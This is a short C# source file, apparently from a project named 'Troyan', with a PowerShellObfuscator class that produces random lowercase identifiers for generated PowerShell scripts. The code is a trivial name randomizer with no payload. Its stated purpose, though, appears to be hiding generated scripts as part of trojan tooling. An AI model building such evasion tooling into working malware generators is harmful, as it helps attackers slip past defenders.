using System.Text;

namespace Troyan.Core;

/// <summary>Lightweight name / snippet randomization for generated PowerShell.</summary>
public sealed class PowerShellObfuscator : IPowerShellObfuscator
{
    private static readonly Random Shared = new();

    public static string GenerateRandomName()
    {
        const string chars = "abcdefghijklmnopqrstuvwxyz";
        var len = Shared.Next(10, 20);
        var sb = new StringBuilder(len);
        for (var i = 0; i < len; i++)
            sb.Append(chars[Shared.Next(chars.Length)]);
        return sb.ToString();
    }

    public string RandomCode() => GenerateRandomName();
}
